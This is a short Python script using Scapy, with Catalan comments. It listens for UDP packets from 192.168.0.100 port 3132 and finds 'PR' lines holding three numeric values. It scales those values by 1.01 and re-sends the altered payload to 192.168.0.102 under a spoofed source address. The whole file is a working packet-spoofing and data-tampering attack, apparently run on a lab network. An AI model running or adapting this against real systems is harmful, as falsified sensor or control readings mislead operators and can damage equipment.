from scapy.all import sniff, IP, UDP, Raw, send
import re

# Configuració
INTERFACE = "enp0s3"
FILTER = "udp and src host 192.168.0.100 and src port 3132"
DST_IP = "192.168.0.102"
DST_PORT = 3132

print("\n🎧 Escoltant paquets des de 192.168.0.100:3132...\n")

def process_packet(packet):
    if IP in packet and UDP in packet and Raw in packet:
        try:
            payload = packet[Raw].load
            decoded = payload.decode(errors="ignore")
        except:
            return

        # Verifica si conté ---PR
        if "PR" in decoded:
            print(f"\n📥 Paquet PR rebut:\n{decoded[:200]}...")

            # Cerca línia PR: ---PR,1,100,val1,val2,val3,...
            match = re.search(r'(PR,\d+,\d+),([\d.]+),([\d.]+),([\d.]+)', decoded)
            if match:
                prefix = match.group(1)
                v1, v2, v3 = match.group(2), match.group(3), match.group(4)

                print(f"🔧 Modificant PR: {v1}, {v2}, {v3} → multiplicats per 1.01")

                # Multiplicació
                new_v1 = str(int(float(v1) * 1.010))
                new_v2 = str(int(float(v2) * 1.010))
                new_v3 = str(int(float(v3) * 1.010))

                old_part = f"{prefix},{v1},{v2},{v3}"
                new_part = f"{prefix},{new_v1},{new_v2},{new_v3}"

                modified_payload = decoded.replace(old_part, new_part).encode()

                # Enviar una sola vegada
                spoofed_packet = IP(src="192.168.0.100", dst=DST_IP) / \
                                 UDP(sport=3132, dport=DST_PORT) / \
                                 Raw(load=modified_payload)

                send(spoofed_packet, iface=INTERFACE, verbose=False)
                print("📤 Paquet PR modificat enviat\n")

# Loop infinit: escolta, modifica i envia un cop
while True:
    sniff(filter=FILTER, iface=INTERFACE, prn=process_packet, count=1)
